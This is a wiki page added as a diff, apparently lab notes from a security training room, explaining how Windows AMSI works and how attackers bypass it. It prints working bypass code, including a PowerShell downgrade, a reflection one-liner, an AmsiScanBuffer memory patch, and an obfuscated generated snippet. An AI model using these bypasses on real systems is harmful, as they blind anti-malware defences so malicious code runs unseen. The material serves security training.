@@ -1,0 +1,183 @@
+<!--
+title: Runtime evasion
+description: 
+published: true
+date: 2022-10-30T16:05:45.111Z
+tags: 
+editor: ckeditor
+dateCreated: 2022-10-30T16:05:42.321Z
+-->
+
+<h1>Introduction</h1>
+<p>With the release of PowerShell &lt;3 the Blue Team, Microsoft released AMSI (Anti-Malware Scan Interface), a runtime monitoring solution designed to stop and monitor ongoing threats.</p>
+<figure class="image image_resized" style="width:141.24px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/432ad7b53c0e37e4d66b3927c34f1e31.png"></figure>
+<p>Learning Objectives</p>
+<ul>
+  <li>Understand the purpose of runtime detections and how they are instrumented.</li>
+  <li>Learn and apply techniques to bypass AMSI.</li>
+  <li>Understand common mitigations and potential alternatives to techniques.</li>
+</ul>
+<p>Runtime detection measures can cause many headaches and roadblocks when executing malicious code. Luckily for us as attackers, there are several techniques and methods we can abuse and leverage to bypass common runtime detection solutions.</p>
+<p>This room will use research from several authors and researchers; all credit goes to the respective owners.</p>
+<p>Before beginning this room, familiarize yourself with operating system architecture as a whole. Basic programming knowledge in C# and PowerShell is also recommended but not required.</p>
+<h1>Runtime Detections</h1>
+<p>When executing code or applications, it will almost always flow through a runtime, no matter the interpreter. This is most commonly seen when using Windows API calls and interacting with .NET. The&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/standard/clr">CLR (<strong>C</strong>ommon&nbsp;<strong>L</strong>anguage&nbsp;<strong>R</strong>untime)</a>&nbsp;and&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview">DLR (<strong>D</strong>ynamic&nbsp;<strong>L</strong>anguage&nbsp;<strong>R</strong>untime)</a>&nbsp;are the runtimes for .NET and are the most common you will encounter when working with Windows systems. In this task, we will not discuss the specifics of runtimes; instead, we will discuss how they are monitored and malicious code is detected.<br>&nbsp;</p>
+<figure class="image image_resized" style="width:141.24px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b066155dd773cbe003eedb5643f46b02.png"></figure>
+<p>A runtime detection measure will scan code before execution in the runtime and determine if it is malicious or not. Depending on the detection measure and technology behind it, this detection could be based on string signatures, heuristics, or behaviors. If code is suspected of being malicious, it will be assigned a value, and if within a specified range, it will stop execution and possibly quarantine or delete the file/code.</p>
+<p>Runtime detection measures are different from a standard anti-virus because they will scan directly from memory and the runtime. At the same time, anti-virus products can also employ these runtime detections to give more insight into the calls and hooks originating from code. In some cases, anti-virus products may use a runtime detection stream/feed as part of their heuristics.</p>
+<p>We will primarily focus on&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">AMSI(<strong>A</strong>nti-<strong>M</strong>alware&nbsp;<strong>S</strong>can&nbsp;<strong>I</strong>nterface)</a>&nbsp;in this room. AMSI is a runtime detection measure shipped natively with Windows and is an interface for other products and solutions.</p>
+<h1>AMSI Overview</h1>
+<p>AMSI (<strong>A</strong>nti-<strong>M</strong>alware&nbsp;<strong>S</strong>can&nbsp;<strong>I</strong>nterface) is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. From Microsoft: "The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any anti-malware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads."</p>
+<p>For more information about AMSI, check out the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/amsi/">Windows docs</a>.</p>
+<p>AMSI will determine its actions from a response code as a result of monitoring and scanning. Below is a list of possible response codes,</p>
+<figure class="image image_resized" style="width:141.24px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/29a13a3e9b0d64542dc9951a49ddda14.png"></figure>
+<ul>
+  <li>AMSI_RESULT_CLEAN = 0</li>
+  <li>AMSI_RESULT_NOT_DETECTED = 1</li>
+  <li>AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384</li>
+  <li>AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479</li>
+  <li>AMSI_RESULT_DETECTED = 32768</li>
+</ul>
+<p>These response codes will only be reported on the backend of AMSI or through third-party implementation. If AMSI detects a malicious result, it will halt execution and send the below error message.</p>
+<p>AMSI Error Response</p>
+<pre><code class="language-plaintext">PS C:Users\Tryhackme&gt; 'Invoke-Hacks'
+At line:1 char:1
++ "Invoke-Hacks"
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+		+ CategoryInfo          : ParserError: (:) []. ParentContainsErrorRecordException
+		+ FullyQualifiedErrorId : ScriptContainedMaliciousContent</code></pre>
+<p>AMSI is fully integrated into the following Windows components,</p>
+<ul>
+  <li>User Account Control, or UAC</li>
+  <li>PowerShell</li>
+  <li>Windows Script Host (wscript and cscript)</li>
+  <li>JavaScript and VBScript</li>
+  <li>Office VBA macros</li>
+</ul>
+<p>As attackers, when targeting the above components, we will need to be mindful of AMSI and its implementations when executing code or abusing components.</p>
+<p>In the next task, we will cover the technical details behind how AMSI works and is instrumented in Windows.</p>
+<h1>AMSI Instrumentation</h1>
+<p>The way AMSI is instrumented can be complex, including multiple DLLs and varying execution strategies depending on where it is instrumented. By definition, AMSI is only an interface for other anti-malware products; AMSI will use multiple provider DLLs and API calls depending on what is being executed and at what layer it is being executed.</p>
+<p>AMSI is instrumented from <code>System.Management.Automation.dll</code>, a .NET assembly developed by Windows;&nbsp;From the Microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications."&nbsp;The .NET assembly will instrument other DLLs and API calls depending on the interpreter and whether it is on disk or memory. The below diagram depicts how data is dissected as it flows through the layers and what DLLs/API calls are being instrumented.</p>
+<figure class="image image_resized" style="width:768.5px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/35e16d45ce27145fcdf231fdb8dcb35e.png"></figure>
+<p>In the above graph data will begin flowing dependent on the interpreter used (PowerShell/VBScript/etc.)&nbsp; Various API calls and interfaces will be instrumented as the data flows down the model at each layer. It is important to understand the complete model of AMSI, but we can break it down into core components, shown in the diagram below.&nbsp;</p>
+<figure class="image image_resized" style="width:869.5px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/efca9438e858f0476a4ffd777c36501a.png"></figure>
+<p>Note: AMSI is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is already being instrumented.</p>
+<p>Most of our research and known bypasses are placed in the Win32 API layer, manipulating the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer">AmsiScanBuffer</a>&nbsp;API call.</p>
+<p>You may also notice the "Other Applications" interface from AMSI. Third-parties such as AV providers can instrument AMSI from their products. Microsoft documents&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions">AMSI functions</a>&nbsp;and the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream">AMSI stream interface</a>.</p>
+<p>We can break down the code for AMSI PowerShell instrumentation to better understand how it is implemented and checks for suspicious content. To find where AMSI is instrumented, we can use&nbsp;<a href="https://github.com/PowerShell/PowerShell/compare/master...cobbr:master">InsecurePowerShell</a>&nbsp;maintained by&nbsp;<a href="https://github.com/cobbr">Cobbr</a>. InsecurePowerShell is a GitHub fork of PowerShell with security features removed; this means we can look through the compared commits and observe any security features. AMSI is only instrumented in twelve lines of code under&nbsp;<code>src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs</code>. These twelve lines are shown below.</p>
+<pre><code class="language-cpp">var scriptExtent = scriptBlockAst.Extent;
+ if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
+ {
+  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
+  throw new ParseException(new[] { parseError });
+ }
+
+ if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
+ {
+  HasSuspiciousContent = true;
+ }</code></pre>
+<p>We can take our knowledge of how AMSI is instrumented and research from others to create and use bypasses that abuse and evade AMSI or its utilities.</p>
+<h1>PowerShell Downgrade</h1>
+<p>The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features.</p>
+<p>Most PowerShell sessions will start with the most recent PowerShell engine, but attackers can manually change the version with a one-liner. By "downgrading" the PowerShell version to 2.0, you bypass security features since they were not implemented until version 5.0.</p>
+<p>The attack only requires a one-liner to execute in our session. We can launch a new PowerShell process with the flags <code>-Version</code> to specify the version (2).</p>
+<pre><code class="language-plaintext">PowerShell -Version 2</code></pre>
+<p>This attack can actively be seen exploited in tools such as&nbsp;<a href="https://github.com/trustedsec/unicorn">Unicorn</a>.</p>
+<pre><code class="language-plaintext">full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+</code></pre>
+<p>Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.</p>
+<p>The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.</p>
+<h1>PowerShell Reflection</h1>
+<p>Reflection allows a user or administrator to access and interact with .NET assemblies. From the Microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications." .NET assemblies may seem foreign; however, we can make them more familiar by knowing they take shape in familiar formats such as exe (<strong>exe</strong>cutable) and dll (<strong>d</strong>ynamic-<strong>l</strong>ink&nbsp;<strong>l</strong>ibrary).</p>
+<p>PowerShell reflection can be abused to modify and identify information from valuable DLLs.</p>
+<p>The AMSI utilities for PowerShell are stored in the <code>AMSIUtils</code> .NET assembly located in <code>System.Management.Automation.AmsiUtils</code>.</p>
+<p>Matt Graeber published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.</p>
+<pre><code class="language-plaintext">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
+<p>To explain the code functionality, we will break it down into smaller sections.</p>
+<p>First, the snippet will call the reflection function and specify it wants to use an assembly from <code>[Ref.Assembly]</code> it will then obtain the type of the AMSI utility using <code>GetType</code>.</p>
+<pre><code class="language-plaintext">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</code></pre>
+<p>The information collected from the previous section will be forwarded to the next function to obtain a specified field within the assembly using <code>GetField</code>.</p>
+<pre><code class="language-plaintext">.GetField('amsiInitFailed','NonPublic,Static')</code></pre>
+<p>The assembly and field information will then be forwarded to the next parameter to set the value from <code>$false</code> to <code>$true</code> using <code>SetValue</code>.</p>
+<pre><code class="language-plaintext">.SetValue($null,$true)</code></pre>
+<p>Once the <code>amsiInitFailed</code> field is set to <code>$true</code>, AMSI will respond with the response code: AMSI_RESULT_NOT_DETECTED = 1</p>
+<h1>Patching AMSI</h1>
+<p>AMSI is primarily instrumented and loaded from <code>amsi.dll</code>; this can be confirmed from the diagram we observed earlier. This dll can be abused and forced to point to a response code we want. The <code>AmsiScanBuffer</code> function provides us the hooks and functionality we need to access the pointer/buffer for the response code.</p>
+<p><code>AmsiScanBuffer</code> is vulnerable because <code>amsi.dll</code> is loaded into the PowerShell process at startup; our session has the same permission level as the utility.</p>
+<p><code>AmsiScanBuffer</code> will scan a "<a href="https://en.wikipedia.org/wiki/Data_buffer">buffer</a>" of suspected code and report it to <code>amsi.dll</code> to determine the response. We can control this function and overwrite the buffer with a clean return code. To identify the buffer needed for the return code, we need to do some reverse engineering; luckily, this research and reverse engineering have already been done. We have the exact return code we need to obtain a clean response!</p>
+<p>We will break down a code snippet modified by BC-Security and inspired by Tal Liberman; you can find the original code&nbsp;<a href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py">here</a>. RastaMouse also has a similar bypass written in C# that uses the same technique; you can find the code&nbsp;<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">here</a>.</p>
+<p>At a high-level AMSI patching can be broken up into four steps,</p>
+<ol>
+  <li>Obtain handle of <code>amsi.dll</code></li>
+  <li>Get process address of <code>AmsiScanBuffer</code></li>
+  <li>Modify memory protections of <code>AmsiScanBuffer</code></li>
+  <li>Write opcodes to <code>AmsiScanBuffer</code></li>
+</ol>
+<p>We first need to load in any external libraries or API calls we want to utilize; we will load&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a>,&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandle</a>, and&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a>&nbsp;from&nbsp;<strong>kernel32</strong>&nbsp;using&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">p/invoke</a>.</p>
+<pre><code class="language-plaintext">[DllImport(`"kernel32`")] // Import DLL where API call is stored
+public static extern IntPtr GetProcAddress( // API Call to import
+	IntPtr hModule, // Handle to DLL module
+	string procName // function or variable to obtain
+);
+
+[DllImport(`"kernel32`")]
+public static extern IntPtr GetModuleHandle(
+	string lpModuleName // Module to obtain handle
+);
+
+[DllImport(`"kernel32`")]
+public static extern bool VirtualProtect(
+	IntPtr lpAddress, // Address of region to modify
+	UIntPtr dwSize, // Size of region
+	uint flNewProtect, // Memory protection options
+	out uint lpflOldProtect // Pointer to store previous protection options
+); </code></pre>
+<p>The functions are now defined, but we need to load the API calls using <code>Add-Type</code>. This cmdlet will load the functions with a proper type and namespace that will allow the functions to be called.</p>
+<pre><code class="language-plaintext">$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+</code></pre>
+<p>Now that we can call our API functions, we can identify where <code>amsi.dll</code> is located and how to get to the function. First, we need to identify the process handle of AMSI using <code>GetModuleHandle</code>. The handle will then be used to identify the process address of <code>AmsiScanBuffer</code> using <code>GetProcAddress</code>.</p>
+<pre><code class="language-plaintext">$handle = [Win32.Kernel32]::GetModuleHandle(
+	'amsi.dll' // Obtains handle to amsi.dll
+);
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
+	$handle, // Handle of amsi.dll
+	'AmsiScanBuffer' // API call to obtain
+); </code></pre>
+<p>Next, we need to modify the memory protection of the <code>AmsiScanBuffer</code> process region. We can specify parameters and the buffer address for <code>VirtualProtect</code>.</p>
+<p>Information on the parameters and their values can be found from the previously mentioned API documentation.</p>
+<pre><code class="language-plaintext">[UInt32]$Size = 0x5; // Size of region
+[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
+[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options
+[Win32.Kernel32]::VirtualProtect(
+	$BufferAddress, // Point to AmsiScanBuffer
+	$Size, // Size of region
+	$ProtectFlag, // Enables R or RW access to region
+	[Ref]$OldProtectFlag // Pointer to store old options
+); </code></pre>
+<p>We need to specify what we want to overwrite the buffer with; the process to identify this buffer can be found&nbsp;<a href="https://rastamouse.me/memory-patching-amsi-bypass/">here</a>. Once the buffer is specified, we can use&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0">marshal copy</a>&nbsp;to write to the process.</p>
+<pre><code class="language-plaintext">$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
+
+[system.runtime.interopservices.marshal]::copy(
+	$buf, // Opcodes/array to write
+	0, // Where to start copying in source array 
+	$BufferAddress, // Where to write (AsmiScanBuffer)
+	6 // Number of elements/opcodes to write
+); </code></pre>
+<p>At this stage, we should have an AMSI bypass that works! It should be noted that with most tooling, signatures and detections can and are crafted to detect this script.&nbsp;</p>
+<h1>Automating for Fun and Profit</h1>
+<p>While it is preferred to use the previous methods shown in this room, attackers can use other automated tools to break AMSI signatures or compile a bypass.</p>
+<p>The first automation tool we will look at is <a href="http://amsi.fail/">amsi.fail</a></p>
+<p><a href="http://amsi.fail/">amsi.fail</a> will compile and generate a PowerShell bypass from a collection of known bypasses. From amsi.fail, "AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before obfuscating. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures."</p>
+<p>Below is an example of an obfuscated PowerShell snippet from amsi.fail</p>
+<pre><code class="language-plaintext">$d=$null;$qcgcjblv=[$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076+7561-7561));$pkgzwpahfwntq="+('lwbj'+'cymh').NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)";[Threading.Thread]::Sleep(1595);[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$(('àmsí'+'Sess'+'íón').norMALiZE([CHaR](70*49/49)+[chAr](87+24)+[ChaR]([bytE]0x72)+[chAr](109)+[chAR](68+43-43)) -replace [CHAr](92)+[chAr]([byTe]0x70)+[CHAr]([bYTE]0x7b)+[cHAr](77*71/71)+[CHar]([bYtE]0x6e)+[char](125+49-49))", "NonPublic,Static").SetValue($d, $null);[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$([chAR]([byTe]0x61)+[Char](109+52-52)+[cHar](46+69)+[CHar]([byTe]0x69)+[CHAR]([BYTe]0x43)+[Char]([ByTe]0x6f)+[chAR](110)+[chaR](116*47/47)+[cHar](101)+[CHAR]([bYte]0x78)+[CHaR]([ByTE]0x74))", "NonPublic,Static").SetValue($null, [IntPtr]$qcgcjblv);
+</code></pre>
+<p>You can attach this bypass at the beginning of your malicious code as with previous bypasses or run it in the same session before executing malicious code.</p>
+<p><a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> allows attackers to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because you are making the file itself clean.</p>
+<p>The syntax for using amsitrigger is relatively straightforward; you need to specify the file or URL and what format to scan the file. Below is an example of running amsitrigger.</p>
+<p>Signatures are highlighted in red; you can break these signatures by encoding, obfuscating, etc.</p>
+<h1>Conclusion</h1>
+<p>Runtime detections and AMSI are only one of many detections and mitigations you can face when employing techniques against a hardened or up-to-date device.</p>
+<p>These bypasses can be used on their own or in a chain with other exploits and techniques to ultimately - evade all the things.</p>
+<p>It is important to keep these tools from this room in your back pocket. You cannot solely rely on them to evade detections, but you can get around and deter a lot of detections using the discussed techniques.</p>
